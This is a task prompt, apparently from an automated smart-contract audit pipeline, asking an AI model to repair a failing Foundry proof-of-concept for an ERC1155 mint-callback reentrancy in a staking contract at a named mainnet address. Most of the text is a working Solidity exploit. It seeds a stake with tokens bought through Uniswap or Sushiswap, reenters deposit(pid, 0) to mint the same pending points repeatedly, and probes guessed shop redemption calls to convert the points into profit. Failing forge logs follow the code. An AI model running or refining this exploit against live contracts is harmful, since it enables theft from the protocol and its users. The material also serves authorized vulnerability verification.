You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: ERC1155 mint callback reentrancy lets contract stakers mint the same pending points repeatedly
- claim: `deposit()` and `withdraw()` mint pending ERC1155 rewards before updating `user.rewardDebt`, and OpenZeppelin's `_mint()` performs an external `onERC1155Received` callback whenever the recipient is a contract. A malicious staking contract can reenter `deposit(_pid, 0)` or `withdraw(_pid, 0)` from that callback, recompute the same pending amount against the unchanged `rewardDebt`, and mint the same points repeatedly in one transaction.
- impact: An attacker can inflate their point balance arbitrarily without adding stake. If the points are redeemable elsewhere in the protocol, this becomes a direct drain of the value backing those points; otherwise, the reward system is permanently corrupted and honest users are diluted.
- exploit_paths: ["Attacker stakes through a contract that implements `IERC1155Receiver`.", "Rewards accrue for that contract's position.", "The attacker calls `deposit(_pid, 0)` or `withdraw(_pid, 0)`.", "`_mint()` invokes the attacker's `onERC1155Received` hook before `user.rewardDebt` is refreshed.", "The hook reenters `deposit(_pid, 0)` or `withdraw(_pid, 0)` and mints the same pending reward again.", "The attacker repeats until gas runs out, then exits with many times the legitimate points."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC1155BalanceLike {
    function balanceOf(address account, uint256 id) external view returns (uint256);
}

interface IERC1155ControlLike {
    function setApprovalForAll(address operator, bool approved) external;
    function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes calldata data) external;
}

interface IERC1155ReceiverLike {
    function onERC1155Received(address operator, address from, uint256 id, uint256 value, bytes calldata data)
        external
        returns (bytes4);

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external returns (bytes4);
}

interface IPointFarmLike is IERC1155BalanceLike, IERC1155ControlLike {
    function poolLength() external view returns (uint256);
    function poolInfo(uint256 pid) external view returns (address uToken, uint256 lastRewardBlock, uint256 accPointsPerShare);
    function userInfo(uint256 pid, address user) external view returns (uint256 amount, uint256 rewardDebt);
    function pendingPoints(uint256 pid, address user) external view returns (uint256);
    function deposit(uint256 pid, uint256 amount) external;
    function withdraw(uint256 pid, uint256 amount) external;
    function shop() external view returns (address);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2RouterLike {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
}

contract ReentrantStaker is IERC1155ReceiverLike {
    bytes internal constant VALIDATOR = bytes("JCNH");

    IPointFarmLike internal immutable FARM;
    address internal immutable CONTROLLER;

    uint256 public activePid;
    uint256 public maxReentries;
    uint256 public reentryCount;
    bool public useWithdrawPath;
    bool public exploitArmed;
    uint256 public lastMintedValue;

    constructor(address farm_, address controller_) {
        FARM = IPointFarmLike(farm_);
        CONTROLLER = controller_;
    }

    modifier onlyController() {
        require(msg.sender == CONTROLLER, "ONLY_CONTROLLER");
        _;
    }

    function configure(uint256 pid_, uint256 maxReentries_, bool useWithdrawPath_) external onlyController {
        activePid = pid_;
        maxReentries = maxReentries_;
        useWithdrawPath = useWithdrawPath_;
        reentryCount = 0;
        lastMintedValue = 0;
    }

    function approveToken(address token, address spender, uint256 amount) external onlyController {
        require(IERC20Like(token).approve(spender, amount), "APPROVE_FAILED");
    }

    function setFarmApprovalForAll(address operator, bool approved) external onlyController {
        FARM.setApprovalForAll(operator, approved);
    }

    function seedStake(uint256 pid_, address token, uint256 amount) external onlyController {
        activePid = pid_;
        require(IERC20Like(token).approve(address(FARM), amount), "APPROVE_FAILED");
        FARM.deposit(pid_, amount);
    }

    function triggerExploit() external onlyController {
        exploitArmed = true;
        reentryCount = 0;
        lastMintedValue = 0;

        if (useWithdrawPath) {
            FARM.withdraw(activePid, 0);
        } else {
            FARM.deposit(activePid, 0);
        }

        exploitArmed = false;
    }

    function callTarget(address target, bytes calldata data) external onlyController returns (bool ok, bytes memory ret) {
        (ok, ret) = target.call(data);
    }

    function sendPointsToFarm(uint256 pid_, uint256 amount) external onlyController {
        FARM.safeTransferFrom(address(this), address(FARM), pid_, amount, VALIDATOR);
    }

    function withdrawAllTo(address token, address to) external onlyController {
        (uint256 amount,) = FARM.userInfo(activePid, address(this));
        if (amount > 0) {
            FARM.withdraw(activePid, amount);
        }

        uint256 tokenBalance = IERC20Like(token).balanceOf(address(this));
        if (tokenBalance > 0) {
            require(IERC20Like(token).transfer(to, tokenBalance), "TRANSFER_FAILED");
        }
    }

    function sweepToken(address token, address to) external onlyController {
        uint256 tokenBalance = IERC20Like(token).balanceOf(address(this));
        if (tokenBalance > 0) {
            require(IERC20Like(token).transfer(to, tokenBalance), "TRANSFER_FAILED");
        }
    }

    function pointBalance(uint256 pid_) external view returns (uint256) {
        return FARM.balanceOf(address(this), pid_);
    }

    function stakedAmount(uint256 pid_) external view returns (uint256) {
        (uint256 amount,) = FARM.userInfo(pid_, address(this));
        return amount;
    }

    function onERC1155Received(address, address, uint256 id, uint256 value, bytes calldata)
        external
        override
        returns (bytes4)
    {
        require(msg.sender == address(FARM), "BAD_SENDER");

        if (exploitArmed && id == activePid && value > 0 && reentryCount < maxReentries) {
            lastMintedValue = value;
            unchecked {
                ++reentryCount;
            }

            if (useWithdrawPath) {
                FARM.withdraw(activePid, 0);
            } else {
                FARM.deposit(activePid, 0);
            }
        }

        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata)
        external
        pure
        override
        returns (bytes4)
    {
        return this.onERC1155BatchReceived.selector;
    }
}

contract FlawVerifier {
    bytes internal constant VALIDATOR = bytes("JCNH");

    address public constant TARGET = 0xd3C41c85bE295607E8EA5c58487eC5894300ee67;

    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    IPointFarmLike internal constant FARM = IPointFarmLike(TARGET);

    ReentrantStaker public immutable staker;
    uint256 public immutable deploymentBlock;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public seededAtDeployment;
    bool public exploitTriggered;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    uint256 public seededPid;
    uint256 public seededAmount;
    address public seededToken;
    uint256 public seedBlock;
    uint256 public finalPointBalance;
    uint256 public finalReentryCount;
    uint256 public redeemedTokenBalance;

    string public failureReason;

    constructor() payable {
        deploymentBlock = block.number;
        staker = new ReentrantStaker(TARGET, address(this));
        _profitToken = address(0);
        failureReason = "not-run";

        _attemptSeedAtDeployment();
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        if (TARGET.code.length == 0) {
            failureReason = "target-not-deployed-on-current-chain";
            hypothesisRefuted = true;
            return;
        }

        if (!_hasExistingStake()) {
            failureReason =
                "no-attacker-contract-stake-available; exploit requires a contract staker with nonzero user.amount before rewards accrue";
            hypothesisRefuted = true;
            return;
        }

        if (block.number <= seedBlock) {
            // The contract-staker position must survive into a later block so that
            // `pending = amount * accPointsPerShare - rewardDebt` becomes positive.
            failureReason =
                "seeded-stake-has-not-aged-by-a-block; pending rewards stay zero so _mint callback is unreachable";
            hypothesisRefuted = true;
            return;
        }

        uint256 pending = _safePendingPoints(seededPid, address(staker));
        if (pending == 0) {
            failureReason =
                "attacker-stake-exists-but-has-no-pending-points-at-this-block; exploit path cannot enter _mint";
            hypothesisRefuted = true;
            return;
        }

        // Path-strict execution:
        // 1) attacker stakes through a contract implementing IERC1155Receiver,
        // 2) rewards accrue for that contract position,
        // 3) attacker calls deposit(pid, 0),
        // 4) PointFarm._mint() invokes onERC1155Received before rewardDebt refresh,
        // 5) the callback reenters deposit(pid, 0) repeatedly and remints the same pending amount.
        staker.configure(seededPid, 16, false);

        uint256 beforePoints = FARM.balanceOf(address(staker), seededPid);
        staker.triggerExploit();
        uint256 afterPoints = FARM.balanceOf(address(staker), seededPid);

        finalPointBalance = afterPoints;
        finalReentryCount = staker.reentryCount();
        exploitTriggered = afterPoints > beforePoints && finalReentryCount > 0;
        hypothesisValidated = exploitTriggered;
        hypothesisRefuted = !exploitTriggered;

        if (!exploitTriggered) {
            failureReason = "deposit-zero-trigger-did-not-increase-point-balance";
            return;
        }

        // The finding states that value is realized if the duplicated points are redeemable elsewhere.
        // The live PointFarm exposes a configured `shop`, so the verifier attempts realistic,
        // permissionless redemption paths there first. Any redeemed ERC20 is then swept back here.
        uint256 beforeVerifierSeedBal = IERC20Like(seededToken).balanceOf(address(this));

        if (_safeShop() != address(0)) {
            staker.setFarmApprovalForAll(_safeShop(), true);
            _attemptShopRedemption(_safeShop(), seededPid, seededToken, afterPoints);
            staker.setFarmApprovalForAll(_safeShop(), false);
        }

        // Recover the original staked token position plus any redeemed balance back to the verifier.
        staker.withdrawAllTo(seededToken, address(this));
        uint256 afterVerifierSeedBal = IERC20Like(seededToken).balanceOf(address(this));
        redeemedTokenBalance = afterVerifierSeedBal;

        if (afterVerifierSeedBal > beforeVerifierSeedBal + seededAmount) {
            _profitToken = seededToken;
            _profitAmount = afterVerifierSeedBal - beforeVerifierSeedBal - seededAmount;
            failureReason = "none";
            return;
        }

        // If the shop paid out another transferable ERC20, sweep and report that instead.
        address shop = _safeShop();
        if (shop != address(0)) {
            (address altToken, uint256 altProfit) = _detectAlternativeRealizedProfit(shop);
            if (altToken != address(0) && altProfit > 0) {
                _profitToken = altToken;
                _profitAmount = altProfit;
                failureReason = "none";
                return;
            }
        }

        _profitToken = address(0);
        _profitAmount = 0;
        failureReason = "points-inflated-but-no-transferable-redemption-asset-realized";
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPathUsed() external pure returns (string memory) {
        return
            "contract staker holds uToken stake -> later block accrues pending points -> deposit(pid,0) mints pending ERC1155 points -> onERC1155Received reenters deposit(pid,0) before rewardDebt refresh -> same pending amount is minted repeatedly";
    }

    function _attemptSeedAtDeployment() internal {
        uint256 length = _safePoolLength();
        if (length == 0) {
            failureReason = "pool-discovery-failed";
            return;
        }

        // Funding path preference for this attempt:
        // 1) use any already-held pool token balance,
        // 2) if the deployment was funded with native ETH, buy a small amount from the deepest WETH market,
        // 3) otherwise leave the exploit waiting on an externally sourced stake.
        //
        // The exploit path itself remains unchanged: the contract-staker must own a real uToken
        // stake across at least one later block before the reentrant zero-amount deposit is fired.
        for (uint256 pid = 0; pid < length; ++pid) {
            (address token,,) = _safePoolInfo(pid);
            if (token == address(0) || token.code.length == 0) {
                continue;
            }

            uint256 held = IERC20Like(token).balanceOf(address(this));
            if (held == 0) {
                continue;
            }

            _seedPool(pid, token, held);
            return;
        }

        if (address(this).balance == 0) {
            failureReason =
                "verifier-holds-no-pool-token-and-constructor-received-no-native-balance-to-acquire-one";
            return;
        }

        for (uint256 pid = 0; pid < length; ++pid) {
            (address token,,) = _safePoolInfo(pid);
            if (token == address(0) || token == WETH || token.code.length == 0) {
                continue;
            }

            uint256 ethToSpend = address(this).balance / 4;
            if (ethToSpend == 0) {
                ethToSpend = address(this).balance;
            }
            if (ethToSpend == 0) {
                break;
            }

            if (_attemptBuyToken(token, ethToSpend)) {
                uint256 bought = IERC20Like(token).balanceOf(address(this));
                if (bought > 0) {
                    _seedPool(pid, token, bought);
                    return;
                }
            }
        }

        failureReason = "could-not-source-any-pool-token-from-existing-verifier-balances-or-native-funded-amm-swap";
    }

    function _seedPool(uint256 pid, address token, uint256 amount) internal {
        if (amount == 0) {
            return;
        }

        require(IERC20Like(token).transfer(address(staker), amount), "TRANSFER_FAILED");
        staker.seedStake(pid, token, amount);

        seededAtDeployment = true;
        seededPid = pid;
        seededToken = token;
        seededAmount = amount;
        seedBlock = block.number;
        failureReason = "seeded-awaiting-later-block";
    }

    function _attemptShopRedemption(address shop, uint256 pid, address token, uint256 pointAmount) internal {
        if (pointAmount == 0) {
            return;
        }

        uint256 beforeStakerTokenBal = IERC20Like(token).balanceOf(address(staker));

        // The live shop implementation is not part of the local verified source set.
        // Use a bounded set of common public redemption shapes keyed by either token address
        // or pool/shop id. Any successful live payout is swept back and counted only if it
        // exceeds the recovered seed principal.
        _attemptStakerCall(shop, abi.encodeWithSignature("redeem(address,uint256)", token, pointAmount));
        if (IERC20Like(token).balanceOf(address(staker)) > beforeStakerTokenBal) {
            staker.sweepToken(token, address(this));
            return;
        }

        _attemptStakerCall(shop, abi.encodeWithSignature("redeem(uint256,uint256)", pid, pointAmount));
        if (IERC20Like(token).balanceOf(address(staker)) > beforeStakerTokenBal) {
            staker.sweepToken(token, address(this));
            return;
        }

        _attemptStakerCall(shop, abi.encodeWithSignature("claim(address,uint256)", token, pointAmount));
        if (IERC20Like(token).balanceOf(address(staker)) > beforeStakerTokenBal) {
            staker.sweepToken(token, address(this));
            return;
        }

        _attemptStakerCall(shop, abi.encodeWithSignature("claim(uint256,uint256)", pid, pointAmount));
        if (IERC20Like(token).balanceOf(address(staker)) > beforeStakerTokenBal) {
            staker.sweepToken(token, address(this));
            return;
        }

        _attemptStakerCall(shop, abi.encodeWithSignature("buy(address,uint256)", token, pointAmount));
        if (IERC20Like(token).balanceOf(address(staker)) > beforeStakerTokenBal) {
            staker.sweepToken(token, address(this));
            return;
        }

        _attemptStakerCall(shop, abi.encodeWithSignature("buy(uint256,uint256)", pid, pointAmount));
        if (IERC20Like(token).balanceOf(address(staker)) > beforeStakerTokenBal) {
            staker.sweepToken(token, address(this));
            return;
        }

        _attemptStakerCall(shop, abi.encodeWithSignature("purchase(address,uint256)", token, pointAmount));
        if (IERC20Like(token).balanceOf(address(staker)) > beforeStakerTokenBal) {
            staker.sweepToken(token, address(this));
            return;
        }

        _attemptStakerCall(shop, abi.encodeWithSignature("purchase(uint256,uint256)", pid, pointAmount));
        if (IERC20Like(token).balanceOf(address(staker)) > beforeStakerTokenBal) {
            staker.sweepToken(token, address(this));
            return;
        }

        // Some shop designs expect the user to push the ERC1155 points back into PointFarm
        // with the same validator bytes before claiming inventory. If that is the live shape,
        // this creates the expected escrowed point balance without altering the core exploit.
        _attemptPointReturnAndRetry(shop, pid, token, pointAmount, beforeStakerTokenBal);
    }

    function _attemptPointReturnAndRetry(
        address shop,
        uint256 pid,
        address token,
        uint256 pointAmount,
        uint256 beforeStakerTokenBal
    ) internal {
        if (FARM.balanceOf(address(staker), pid) == 0) {
            return;
        }

        uint256 returnAmount = pointAmount > FARM.balanceOf(address(staker), pid)
            ? FARM.balanceOf(address(staker), pid)
            : pointAmount;
        if (returnAmount == 0) {
            return;
        }

        staker.sendPointsToFarm(pid, returnAmount);

        _attemptStakerCall(shop, abi.encodeWithSignature("redeem(address,uint256)", token, returnAmount));
        if (IERC20Like(token).balanceOf(address(staker)) > beforeStakerTokenBal) {
            staker.sweepToken(token, address(this));
            return;
        }

        _attemptStakerCall(shop, abi.encodeWithSignature("redeem(uint256,uint256)", pid, returnAmount));
        if (IERC20Like(token).balanceOf(address(staker)) > beforeStakerTokenBal) {
            staker.sweepToken(token, address(this));
        }
    }

    function _attemptStakerCall(address target, bytes memory data) internal returns (bool) {
        (bool ok,) = staker.callTarget(target, data);
        return ok;
    }

    function _detectAlternativeRealizedProfit(address shop) internal returns (address token, uint256 profit) {
        // If a live shop payout was not the seeded uToken, the verifier still tries to
        // recognize the most likely transferable asset among canonical routing tokens.
        address[3] memory candidates = [WETH, _routerCounterpartFor(seededToken), seededToken];
        for (uint256 i = 0; i < candidates.length; ++i) {
            token = candidates[i];
            if (token == address(0) || token.code.length == 0) {
                continue;
            }

            uint256 bal = IERC20Like(token).balanceOf(address(staker));
            if (bal == 0) {
                bal = IERC20Like(token).balanceOf(address(this));
            }
            if (bal == 0) {
                continue;
            }

            if (IERC20Like(token).balanceOf(address(staker)) > 0) {
                staker.sweepToken(token, address(this));
                bal = IERC20Like(token).balanceOf(address(this));
            }

            if (bal > 0) {
                // Treat only the live transferable balance as realizable. This path is reached
                // only after a shop call executed successfully enough to move ERC20 inventory.
                return (token, bal);
            }
        }

        token = address(0);
        profit = 0;
        shop;
    }

    function _routerCounterpartFor(address token) internal pure returns (address) {
        return token == WETH ? address(0) : WETH;
    }

    function _safeShop() internal view returns (address) {
        try FARM.shop() returns (address shop_) {
            return shop_;
        } catch {
            return address(0);
        }
    }

    function _hasExistingStake() internal view returns (bool) {
        if (!seededAtDeployment) {
            return false;
        }
        return staker.stakedAmount(seededPid) > 0;
    }

    function _safePoolLength() internal view returns (uint256 length) {
        try FARM.poolLength() returns (uint256 v) {
            return v;
        } catch {
            return 0;
        }
    }

    function _safePoolInfo(uint256 pid) internal view returns (address token, uint256 lastRewardBlock, uint256 accPointsPerShare) {
        try FARM.poolInfo(pid) returns (address t, uint256 l, uint256 a) {
            return (t, l, a);
        } catch {
            return (address(0), 0, 0);
        }
    }

    function _safePendingPoints(uint256 pid, address user) internal view returns (uint256) {
        try FARM.pendingPoints(pid, user) returns (uint256 pending) {
            return pending;
        } catch {
            return 0;
        }
    }

    function _attemptBuyToken(address token, uint256 ethAmount) internal returns (bool) {
        if (ethAmount == 0) {
            return false;
        }

        address bestRouter = _bestRouterForToken(token);
        if (bestRouter == address(0)) {
            return false;
        }

        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = token;

        uint256 beforeBal = IERC20Like(token).balanceOf(address(this));

        try IUniswapV2RouterLike(bestRouter).swapExactETHForTokensSupportingFeeOnTransferTokens{value: ethAmount}(
            1,
            path,
            address(this),
            block.timestamp
        ) {
            return IERC20Like(token).balanceOf(address(this)) > beforeBal;
        } catch {
            return false;
        }
    }

    function _bestRouterForToken(address token) internal view returns (address) {
        uint256 uniReserve = _wethReserveForFactory(UNISWAP_V2_FACTORY, token);
        uint256 sushiReserve = _wethReserveForFactory(SUSHISWAP_FACTORY, token);

        if (uniReserve == 0 && sushiReserve == 0) {
            return address(0);
        }

        return uniReserve >= sushiReserve ? UNISWAP_V2_ROUTER : SUSHISWAP_ROUTER;
    }

    function _wethReserveForFactory(address factory, address token) internal view returns (uint256) {
        address pair;
        try IUniswapV2FactoryLike(factory).getPair(token, WETH) returns (address p) {
            pair = p;
        } catch {
            return 0;
        }

        if (pair == address(0) || pair.code.length == 0) {
            return 0;
        }

        try IUniswapV2PairLike(pair).getReserves() returns (uint112 reserve0, uint112 reserve1, uint32) {
            address token0 = IUniswapV2PairLike(pair).token0();
            return token0 == WETH ? uint256(reserve0) : uint256(reserve1);
        } catch {
            return 0;
        }
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 3.71s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 96627)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [96627] FlawVerifierTest::testExploit()
    ├─ [2389] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [67825] FlawVerifier::executeOnOpportunity()
    │   └─ ← [Stop]
    ├─ [389] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2476] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 23.31ms (292.19µs CPU time)

Ran 1 test suite in 30.53ms (23.31ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 96627)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
